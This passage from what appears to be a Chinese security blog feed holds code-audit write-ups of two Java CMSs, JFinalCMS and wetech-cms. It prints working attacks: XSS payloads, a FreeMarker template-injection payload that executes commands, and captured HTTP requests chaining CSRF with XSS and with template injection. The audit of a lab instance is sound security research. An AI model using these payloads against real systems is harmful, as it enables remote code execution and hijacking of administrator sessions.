class="line">data.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;操作错误&quot;</span>);</span><br><span class="line">data.put(<span class="string">&quot;state&quot;</span>, <span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">renderJson(data);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> StorageUtils.upload(fileType, uploadFile, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isEmpty(url)) &#123;</span><br><span class="line">data.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;上传文件出现错误&quot;</span>);</span><br><span class="line">data.put(<span class="string">&quot;state&quot;</span>, <span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">renderJson(data);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">data.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;成功&quot;</span>);</span><br><span class="line">data.put(<span class="string">&quot;state&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>);</span><br><span class="line">data.put(<span class="string">&quot;url&quot;</span>, url);</span><br><span class="line">uploadFile.getFile().delete();</span><br><span class="line">renderJson(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​经过审计和测试，我发现该区域可以上传html文件，实现XSS。</p><p>​我们上传一个写入了XSSpayload的图片文件，上传后抓包，修改后缀为html即可实现XSS攻击。</p><p><img src="/img/JFinalCMS/image-20241203130553075.png" alt="image-20241203130553075"></p><p>​访问返回的URL</p><p><img src="/img/JFinalCMS/image-20241203130625910.png" alt="image-20241203130625910"></p><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><h4 id="src-main-java-com-cms-controller-admin-TemplateController-java"><a href="#src-main-java-com-cms-controller-admin-TemplateController-java" class="headerlink" title="src\main\java\com\cms\controller\admin\TemplateController.java"></a>src\main\java\com\cms\controller\admin\TemplateController.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> getPara(<span class="string">&quot;fileName&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">directory</span> <span class="operator">=</span> getPara(<span class="string">&quot;directory&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> getPara(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isBlank(fileName) || content == <span class="literal">null</span>) &#123;</span><br><span class="line">render(CommonAttribute.ADMIN_ERROR_VIEW);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">TemplateUtils.write(SystemUtils.getConfig().getTheme()+<span class="string">&quot;/&quot;</span>+directory.replaceAll(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+fileName, content);</span><br><span class="line">FreeMarkerRender.getConfiguration().clearTemplateCache();</span><br><span class="line">redirect(getListQuery(<span class="string">&quot;/admin/template/list&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们定位到前端的模板编辑功能</p><p><img src="/img/JFinalCMS/image-20241203184741148.png" alt="image-20241203184741148"></p><p>​审计代码我们可知，模板修改的过程中没有进行过滤，因此我们可以直接嵌入payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125; </span><br></pre></td></tr></table></figure><p>​我们选择about.html这个模板文件，然后写入payload。</p><p><img src="/img/JFinalCMS/image-20241203184912279.png" alt="image-20241203184912279"></p><p>​保存，然后访问about页面。</p><p><img src="/img/JFinalCMS/image-20241203184949248.png" alt="image-20241203184949248"></p><h2 id="前端渗透测试"><a href="#前端渗透测试" class="headerlink" title="前端渗透测试"></a>前端渗透测试</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>​经过审计我发现，该项目没有对XSS进行拦截或过滤，所以该项目多处存在XSS。这里篇幅所限，我只拿出其中一个反射型XSS来演示。</p><p>​我们来到标签模块的控制器这里</p><h4 id="src-main-java-com-cms-controller-admin-TagController-java"><a href="#src-main-java-com-cms-controller-admin-TagController-java" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;com&#x2F;cms&#x2F;controller&#x2F;admin&#x2F;TagController.java"></a>src&#x2F;main&#x2F;java&#x2F;com&#x2F;cms&#x2F;controller&#x2F;admin&#x2F;TagController.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> getPara(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">pageNumber</span> <span class="operator">=</span> getParaToInt(<span class="string">&quot;pageNumber&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(pageNumber==<span class="literal">null</span>)&#123;</span><br><span class="line">            pageNumber = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        setAttr(<span class="string">&quot;page&quot;</span>, <span class="keyword">new</span> <span class="title class_">Tag</span>().dao().findPage(name,pageNumber,PAGE_SIZE));</span><br><span class="line">        setAttr(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        render(getView(<span class="string">&quot;tag/list&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​可以看到这里直接就把name放模板里边了，没有进行任何过滤，接下来我们回到前端的标签模块，进行查询，后抓包，得到如下路由：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/content/list?categoryId=1&amp;title=&amp;pageSize=20&amp;totalPage=1</span><br></pre></td></tr></table></figure><p>​其中的title就是XSS注入点，我们构造一下payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>//</span><br></pre></td></tr></table></figure><p>​放到title参数中，访问后即可触发XSS。</p><p><img src="/img/JFinalCMS/image-20241203192550271.png" alt="image-20241203192550271"></p><p>​当然注入点很多，也存在很多POST的存储型注入，但是利用难度较大，不过这个项目还存在CSRF，因此还可尝试CSRF+XSS的组合拳。</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>​我们先构造数据包，我们创建一个标签，抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/tag/save</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.113.43:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.113.43:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.113.43:8888/admin/tag/add</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=807D599B9C63E998E02431A4EEDB2C7C</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span>CSRF</span></span><br></pre></td></tr></table></figure><p>​构造CSRF的POC，模拟管理员受到CSRF攻击。</p><p><img src="/img/JFinalCMS/image-20241203193127386.png" alt="image-20241203193127386"></p><p>​可以看到成功新增了标签，但是CSRF能做的远不止于此。</p><h3 id="CSRF-XSS"><a href="#CSRF-XSS" class="headerlink" title="CSRF+XSS"></a>CSRF+XSS</h3><p>​经过审计我们知道，这个项目没有过滤和拦截XSS，所以我们构造一个名称为XSSpayload的标签，payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">CSRF</span>+<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p>​抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/form_model/save</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.113.43:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>60</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.113.43:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.113.43:8888/admin/form_model/add</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=A3628DAC00BED9F645E9E30C003F27B1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">name</span>=%<span class="number">3</span>Cimg+src%<span class="number">3</span>Dx+onerror%<span class="number">3</span>Dalert%<span class="number">28</span>%<span class="number">27</span>CSRF%<span class="number">2</span>Bxss%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>E</span></span><br></pre></td></tr></table></figure><p>​构造CSRF的POC。访问后成功创建了嵌入XSSpayload的表单模型，并触发了XSS攻击。</p><p><img src="/img/JFinalCMS/image-20241203193643705.png" alt="image-20241203193643705"></p><h3 id="CSRF-SSTI（模板注入漏洞）"><a href="#CSRF-SSTI（模板注入漏洞）" class="headerlink" title="CSRF+SSTI（模板注入漏洞）"></a>CSRF+SSTI（模板注入漏洞）</h3><p>​我们前面的测试已经验证了存在SSTI，但是这需要极高的管理员权限，所以利用难度较大，可如果我们将CSRF和模板注入漏洞进行组合，那么我们的利用难度就会大大降低。</p><p>​我们先构造含有SSTI攻击的POC，先在模板修改这里修改一下模板，嵌入攻击语句，抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/template/update</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.113.43:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>897</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.113.43:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.113.43:8888/admin/template/edit?fileName=banner.html&amp;directory=,front</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>listQuery=%3FfileName%3Dbanner.html%26directory%3D%2Cfront; JSESSIONID=A3628DAC00BED9F645E9E30C003F27B1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">fileName<span class="operator">=</span>banner.html&amp;directory<span class="operator">=</span><span class="variable">%2</span>Cfront&amp;content<span class="operator">=</span><span class="variable">%3</span>C<span class="variable">%23</span>assign+value<span class="variable">%3</span>D<span class="variable">%22</span>freemarker.template.utility.Execute<span class="variable">%22</span><span class="variable">%3</span>Fnew<span class="variable">%28</span><span class="variable">%29</span><span class="variable">%3</span>E<span class="variable">%24</span><span class="variable">%7</span>Bvalue<span class="variable">%28</span><span class="variable">%22</span>calc.exe<span class="variable">%22</span><span class="variable">%29</span><span class="variable">%7</span>D+<span class="variable">%0</span>D<span class="variable">%0</span>A+<span class="variable">%3</span>Cdiv+class<span class="variable">%3</span>D<span class="variable">%22</span>caselist-banner<span class="variable">%22</span><span class="variable">%3</span>E<span class="variable">%0</span>D<span class="variable">%0</span>A+<span class="variable">%09</span><span class="variable">%3</span>Cdiv+class<span class="variable">%3</span>D<span class="variable">%22</span>overlay<span class="variable">%22</span><span class="variable">%3</span>E<span class="variable">%0</span>D<span class="variable">%0</span>A+<span class="variable">%09</span><span class="variable">%3</span>Cdiv+class<span class="variable">%3</span>D<span class="variable">%22</span>hero-<span class="keyword">section</span>+am-text-center<span class="variable">%22</span><span class="variable">%3</span>E<span class="variable">%0</span>D<span class="variable">%0</span>A+<span class="variable">%09</span><span class="variable">%09</span><span class="variable">%3</span>Ch<span class="number">1</span><span class="variable">%3</span>E<span class="variable">%E6</span><span class="variable">%8</span>C<span class="variable">%81</span><span class="variable">%E7</span><span class="variable">%BB</span><span class="variable">%AD</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%BA</span><span class="variable">%E5</span><span class="variable">%AE</span><span class="variable">%A2</span><span class="variable">%E6</span><span class="variable">%88</span><span class="variable">%B7</span><span class="variable">%E5</span><span class="variable">%88</span><span class="variable">%9</span>B<span class="variable">%E9</span><span class="variable">%80</span><span class="variable">%A0</span><span class="variable">%E4</span><span class="variable">%BB</span><span class="variable">%B7</span><span class="variable">%E5</span><span class="variable">%80</span><span class="variable">%BC</span><span class="variable">%3</span>C<span class="variable">%2</span>Fh<span class="number">1</span><span class="variable">%3</span>E<span class="variable">%0</span>D<span class="variable">%0</span>A+<span class="variable">%09</span><span class="variable">%09</span><span class="variable">%3</span>Cp<span class="variable">%3</span>E<span class="number">5</span><span class="variable">%E5</span><span class="variable">%B9</span><span class="variable">%B4</span><span class="variable">%E6</span><span class="variable">%9</span>D<span class="variable">%A5</span><span class="variable">%E6</span><span class="variable">%88</span><span class="variable">%91</span><span class="variable">%E4</span><span class="variable">%BB</span><span class="variable">%AC</span><span class="variable">%E7</span><span class="variable">%A7</span><span class="variable">%AF</span><span class="variable">%E7</span><span class="variable">%B4</span><span class="variable">%AF</span><span class="variable">%E4</span><span class="variable">%BA</span><span class="variable">%86</span><span class="variable">%E5</span><span class="variable">%A4</span><span class="variable">%A7</span><span class="variable">%E9</span><span class="variable">%87</span><span class="variable">%8</span>F<span class="variable">%E7</span><span class="variable">%9</span>A<span class="variable">%84</span><span class="variable">%E9</span><span class="variable">%A1</span><span class="variable">%B9</span><span class="variable">%E7</span><span class="variable">%9</span>B<span class="variable">%AE</span><span class="variable">%E6</span><span class="variable">%A1</span><span class="variable">%88</span><span class="variable">%E4</span><span class="variable">%BE</span><span class="variable">%8</span>B<span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8</span>C<span class="variable">%E5</span><span class="variable">%B9</span><span class="variable">%B6</span><span class="variable">%E5</span><span class="variable">%9</span>C<span class="variable">%A8</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8</span>D<span class="variable">%E6</span><span class="variable">%96</span><span class="variable">%AD</span><span class="variable">%E7</span><span class="variable">%9</span>A<span class="variable">%84</span><span class="variable">%E6</span><span class="variable">%8</span>E<span class="variable">%A2</span><span class="variable">%E7</span><span class="variable">%B4</span><span class="variable">%A2</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%AD</span><span class="variable">%E6</span><span class="variable">%80</span><span class="variable">%BB</span><span class="variable">%E7</span><span class="variable">%BB</span><span class="variable">%93</span><span class="variable">%E7</span><span class="variable">%BB</span><span class="variable">%8</span>F<span class="variable">%E9</span><span class="variable">%AA</span><span class="variable">%8</span>C<span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8</span>C<span class="variable">%E5</span><span class="variable">%B8</span><span class="variable">%AE</span><span class="variable">%E6</span><span class="variable">%82</span><span class="variable">%A8</span><span class="variable">%E6</span><span class="variable">%8</span>C<span class="variable">%96</span><span class="variable">%E6</span><span class="variable">%8</span>E<span class="variable">%98</span><span class="variable">%E5</span><span class="variable">%92</span><span class="variable">%8</span>C<span class="variable">%E5</span><span class="variable">%88</span><span class="variable">%9</span>B<span class="variable">%E6</span><span class="variable">%96</span><span class="variable">%B0</span><span class="variable">%E6</span><span class="variable">%9</span>B<span class="variable">%B4</span><span class="variable">%E5</span><span class="variable">%A4</span><span class="variable">%A7</span><span class="variable">%E5</span><span class="variable">%95</span><span class="variable">%86</span><span class="variable">%E6</span><span class="variable">%9</span>C<span class="variable">%BA</span><span class="variable">%E7</span><span class="variable">%9</span>A<span class="variable">%84</span><span class="variable">%E5</span><span class="variable">%8</span>F<span class="variable">%AF</span><span class="variable">%E8</span><span class="variable">%83</span><span class="variable">%BD</span><span class="variable">%3</span>C<span class="variable">%2</span>Fp<span class="variable">%3</span>E<span class="variable">%0</span>D<span class="variable">%0</span>A++++++<span class="variable">%3</span>C<span class="variable">%2</span>Fdiv<span class="variable">%3</span>E<span class="variable">%0</span>D<span class="variable">%0</span>A++++++<span class="variable">%3</span>C<span class="variable">%2</span>Fdiv<span class="variable">%3</span>E<span class="variable">%0</span>D<span class="variable">%0</span>A+<span class="variable">%3</span>C<span class="variable">%2</span>Fdiv<span class="variable">%3</span>E</span></span><br></pre></td></tr></table></figure><p>​构造CSRF的POC，drop掉数据包，模拟管理员受到攻击，访问POC。然后访问关于页面。</p><p><img src="/img/JFinalCMS/image-20241203194517774.png" alt="image-20241203194517774"></p><p>​成功执行命令。</p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>​创建一个低权限用户组和一个低权限用户。</p><p><img src="/img/JFinalCMS/image-20241203194843474.png" alt="image-20241203194843474"></p><p>​<img src="/img/JFinalCMS/image-20241203194853014.png" alt="image-20241203194853014"></p><p>​登录test用户获取cookie，但是经过我的审计和测试，这个项目似乎并没有做出权限校验的功能？所以越权漏洞就不在这里写出，如果有兴趣的师傅可以自行下载项目进行测试。</p><p>​至此，审计结束。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wetech-cms</title>
      <link href="/2024/11/28/wetech-cms/"/>
      <url>/2024/11/28/wetech-cms/</url>
      
        <content type="html"><![CDATA[<h2 id="项目技术栈"><a href="#项目技术栈" class="headerlink" title="项目技术栈"></a>项目技术栈</h2><h3 id="后端技术"><a href="#后端技术" class="headerlink" title="后端技术"></a>后端技术</h3><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>Spring Framework</td><td>容器</td><td>4.3.5.RELEASE</td><td><a href="http://projects.spring.io/spring-framework/">http://projects.spring.io/spring-framework/</a></td></tr><tr><td>SpringMVC</td><td>MVC框架</td><td>4.3.5.RELEASE</td><td><a href="http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/#mvc">http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/#mvc</a></td></tr><tr><td>Hibernate</td><td>ORM框架</td><td>4.2.0.Final</td><td><a href="http://hibernate.org/">http://hibernate.org/</a></td></tr><tr><td>Maven</td><td>项目构建管理</td><td>4.0.0</td><td><a href="http://maven.apache.org/">http://maven.apache.org</a></td></tr><tr><td>Freemarker</td><td>模板引擎</td><td>2.3.23</td><td><a href="https://freemarker.apache.org/">https://freemarker.apache.org/</a></td></tr><tr><td>Logback</td><td>日志组件</td><td>1.1.3</td><td><a href="https://logback.qos.ch/">https://logback.qos.ch</a></td></tr><tr><td>Dbcp2</td><td>数据库连接池</td><td>2.1.1</td><td><a href="https://github.com/alibaba/druid">https://github.com/alibaba/druid</a></td></tr><tr><td>Hibernate Validator</td><td>后端校验框架</td><td>5.4.2.Final</td><td><a href="http://hibernate.org/validator/">http://hibernate.org/validator/</a></td></tr><tr><td>DWR</td><td>WEB远程调用框架</td><td>3.0.1-RELEASE</td><td><a href="http://directwebremoting.org/dwr/index.html">http://directwebremoting.org/dwr/index.html</a></td></tr><tr><td>Thumbnailator</td><td>生成高质量缩略图的Java类库</td><td>0.4.3</td><td><a href="https://github.com/coobird/thumbnailator">https://github.com/coobird/thumbnailator</a></td></tr></tbody></table><h3 id="前端技术"><a href="#前端技术" class="headerlink" title="前端技术"></a>前端技术</h3><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>jQuery</td><td>优秀的Javascript库</td><td>3.1.1</td><td><a href="http://jquery.com/">http://jquery.com/</a></td></tr><tr><td>Amaze UI</td><td>前端框架</td><td>2.7.2</td><td><a href="http://amazeui.org/">http://amazeui.org/</a></td></tr><tr><td>DataTables</td><td>数据表格</td><td>1.10.16</td><td><a href="https://www.datatables.net/">https://www.datatables.net/</a></td></tr><tr><td>Layer</td><td>jQuery弹出层插件</td><td>3.0.1</td><td><a href="http://layer.layui.com/">http://layer.layui.com/</a></td></tr><tr><td>ZTree</td><td>jQuery树插件</td><td>3.5.12</td><td><a href="http://www.treejs.cn/">http://www.treejs.cn</a></td></tr><tr><td>WangEditor</td><td>轻量级web富文本编辑器</td><td>2.1.22</td><td><a href="http://www.wangeditor.com/">http://www.wangeditor.com/</a></td></tr></tbody></table><h2 id="项目依赖审计"><a href="#项目依赖审计" class="headerlink" title="项目依赖审计"></a>项目依赖审计</h2><p>​项目依赖中的已披露漏洞均不存在利用条件</p><h2 id="单点漏洞审计"><a href="#单点漏洞审计" class="headerlink" title="单点漏洞审计"></a>单点漏洞审计</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>​由于后端数据库交互使用的不是mybatis，所以我们搜索$找不到注入点，但是我们可以尝试寻找动态拼接。</p><p>​搜索select</p><h4 id="src-main-java-tech-wetech-basic-dao-BaseDao-java-失败"><a href="#src-main-java-tech-wetech-basic-dao-BaseDao-java-失败" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;basic&#x2F;dao&#x2F;BaseDao.java(失败)"></a>src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;basic&#x2F;dao&#x2F;BaseDao.java(失败)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getCountHql</span><span class="params">(String queryString,<span class="type">boolean</span> isHql)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">e</span> <span class="operator">=</span> queryString.substring(queryString.indexOf(<span class="string">&quot;from&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> <span class="string">&quot;select count(*) &quot;</span>+e;</span><br><span class="line"><span class="keyword">if</span>(isHql)</span><br><span class="line">c.replaceAll(<span class="string">&quot;fetch&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​该查询语句使用了动态拼接，e的字符串是以传入的SQL语句中的第一个from为索引进行分割，之后拼接进查询语句中。同时这里代码有个判断，如果是true就会把查询语句中的fetch删除，查找方法调用也发现有两个调用方式，一个为true，一个false，我们先追溯第一个传入true的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Pager&lt;T&gt; <span class="title function_">find</span><span class="params">(String hql, Object[] args, Map&lt;String, Object&gt; alias)</span> &#123;</span><br><span class="line">hql = initSort(hql);</span><br><span class="line"><span class="type">String</span> <span class="variable">cq</span> <span class="operator">=</span> getCountHql(hql,<span class="literal">true</span>);</span><br><span class="line">···代码省略···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">initSort</span><span class="params">(String hql)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">order</span> <span class="operator">=</span> SystemContext.getOrder();</span><br><span class="line"><span class="type">String</span> <span class="variable">sort</span> <span class="operator">=</span> SystemContext.getSort();</span><br><span class="line"><span class="keyword">if</span>(sort!=<span class="literal">null</span>&amp;&amp;!<span class="string">&quot;&quot;</span>.equals(sort.trim())) &#123;</span><br><span class="line">hql+=<span class="string">&quot; order by &quot;</span>+sort;</span><br><span class="line"><span class="keyword">if</span>(!<span class="string">&quot;desc&quot;</span>.equals(order)) hql+=<span class="string">&quot; asc&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> hql+=<span class="string">&quot; desc&quot;</span>;</span><br><span class="line">&#125;</span><br><span 